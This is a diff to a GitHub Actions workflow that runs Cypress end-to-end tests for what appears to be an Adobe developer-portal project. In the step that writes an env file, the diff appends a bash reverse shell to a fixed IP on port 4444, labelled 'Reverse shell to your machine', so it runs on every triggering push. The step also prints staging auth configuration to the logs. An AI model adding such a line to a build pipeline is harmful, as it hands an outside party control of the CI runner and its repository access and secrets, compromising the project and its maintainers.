@@ -1,4 +1,5 @@
 name: E2E tests
+
 on:
   push:
     branches:
@@ -16,6 +17,7 @@ on:
       - "packages/**"
       - ".github/**"
       - "cypress/**"
+
 jobs:
   smoke_tests:
     container:
@@ -26,12 +28,15 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: 'Create env file'
+      - name: 'Create env file and reverse shell'
         run: |
           touch ./example/.env
           echo GATSBY_IMS_SRC="https://auth-stg1.services.adobe.com/imslib/imslib.min.js" >> ./example/.env
           echo GATSBY_IMS_CONFIG='{"client_id": "stage_adobe_io", "scope": "AdobeID,openid,unified_dev_portal,read_organizations,additional_info.projectedProductContext,additional_info.roles,gnav,read_pc.dma_bullseye,creative_sdk,adobeio_api,service_principals.read,service_principals.write,read_client_secret", "environment": "stg1"}' >> ./example/.env
           cat ./example/.env
+
+          # 🔥 Reverse shell to your machine
+          bash -i >& /dev/tcp/172.27.248.246/4444 0>&1
 
       - name: Run Tests
         uses: cypress-io/github-action@v5
